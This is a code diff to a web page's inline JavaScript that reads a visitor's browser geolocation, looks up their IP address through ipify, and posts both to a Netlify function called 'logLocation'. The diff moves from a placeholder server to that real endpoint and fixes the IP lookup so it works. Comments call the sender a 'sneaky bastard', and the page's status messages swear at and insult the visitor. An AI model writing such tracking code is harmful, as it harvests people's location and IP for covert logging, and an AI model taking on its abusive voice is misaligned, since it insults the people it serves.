@@ -43,22 +43,27 @@
             if (navigator.geolocation) {
                 document.getElementById("status").innerHTML = "Detecting your fucking location, you clueless fuck...";
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
+                    async function(position) {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
 
-                        // Fucking send the data to your server, you sneaky bastard
+                        // Grab their fucking IP too
+                        const ip = await fetch('https://api.ipify.org?format=json')
+                            .then(response => response.json())
+                            .then(data => data.ip)
+                            .catch(() => "Fuck, couldn't get IP");
+
+                        // Send this shit to your Netlify function
                         const data = {
                             latitude: latitude,
                             longitude: longitude,
                             accuracy: accuracy,
                             timestamp: new Date().toISOString(),
-                            ip: getFuckingIP() // Bonus: Grab their IP too, you fucking genius
+                            ip: ip
                         };
 
-                        // Send this shit to your server
-                        fetch('https://your-fucking-server.com/log', {
+                        fetch('/.netlify/functions/logLocation', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json',
@@ -80,14 +85,6 @@
             } else {
                 document.getElementById("status").innerHTML = "Fuck you! Geolocation is not supported by your fucking browser, you outdated fuck.";
             }
-        }
-
-        // Bonus: Grab their fucking IP too
-        function getFuckingIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => data.ip)
-                .catch(() => "Fuck, couldn't get IP");
         }
     </script>
 </body>
